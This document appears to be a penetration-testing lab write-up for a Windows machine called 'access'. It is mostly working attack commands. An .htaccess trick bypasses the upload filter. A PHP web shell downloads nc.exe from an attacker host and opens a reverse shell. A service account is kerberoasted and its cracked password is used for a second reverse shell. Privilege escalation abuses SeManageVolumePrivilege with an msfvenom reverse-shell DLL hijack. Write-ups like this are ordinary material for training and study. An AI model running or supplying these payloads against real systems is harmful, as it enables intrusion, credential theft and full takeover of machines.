## Takeaway
- With file upload, see if you can upload `.htaccess` file, to add a new extension to bypass extension check completely.
	- `echo 'AddHandler application/x-httpd-php .hacker' > .htaccess`
## Metadata
- Port `80` is running a web application that allows file upload at the `Purchase Ticket` Section and uploaded files can be found at `http://192.168.163.187/uploads/`.![[Pasted image 20240320180610.png]]
	-   However, the upload does not allow any `php` extension but allow `.htaccess`. 
- Running `Rubeus` will identify `access\svc_mssql` as kerberoastable.![[Pasted image 20240321131651.png]]
	- Run `hashid -m 13100 svc_mssql.hash /usr/share/wordlists/rockyou.txt --force` to retrieve credential pair as `access\svc_mssql:trustno1`.![[Pasted image 20240321132002.png]]
- `svc_mssql` has privilege `SeManageVolumePrivilege` which grants `privileged write` to whole `C:\` hence give a path to system.![[Pasted image 20240321134416.png]]
	- https://github.com/CsEnox/SeManageVolumeExploit
# Exploitation
## Shell as svc_apache
- Run `echo 'AddHandler application/x-httpd-php .hacker' > .htaccess` to prepare for `.htaccess` file.
- Prepare a payload called `rev.hacker` with following contents:
```php
<?php system('powershell.exe -nop -w hidden -c iex(iwr http://192.168.45.189/Windows/nc.exe -UseBasicParsing -outfile nc.exe); .\nc.exe 192.168.45.189 443 -e cmd.exe'); ?>
```
- Upload both files using `Purchase Ticket` functionality.
- Set up listener and navigate to `http://192.168.163.187/uploads/rev.hacker` to receive a reverse shell call back.
## Shell as svc_mssql
- Run the following command to get a shell as `svc_mssql`:
```shell
curl http://192.168.45.189/Windows/Invoke-RunasCs.ps1 -outfile Invoke-RunasCs.ps1

Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force

. .\Invoke-RunasCs.ps1

Invoke-RunasCs svc_mssql trustno1 "nc.exe 192.168.45.189 443 -e cmd.exe"
```
 # PrivEsc
 - Within the shell of `svc_mssql`: 
	 - Upload exploit with `curl http://192.168.45.189/Windows/Privs/SeManageVolumeExploit.exe -O` and run `.\SeManageVolumeExploit.exe` to abuse `SeManageVolumePrivilege` and grant write privilege to all `C:\`.
	 - Generate malicious `dll` with `msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.189 lport=443 -f dll -o Printconfig.dll`.
	 - Upload onto `C:\Windows\System32\spool\drivers\x64\3` with `curl http://192.168.45.189:1234/Printconfig.dll -O`.
	 - Spawn a PowerShell session and run following code to receive a reverse shell call back:
		```shell
		$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
		```
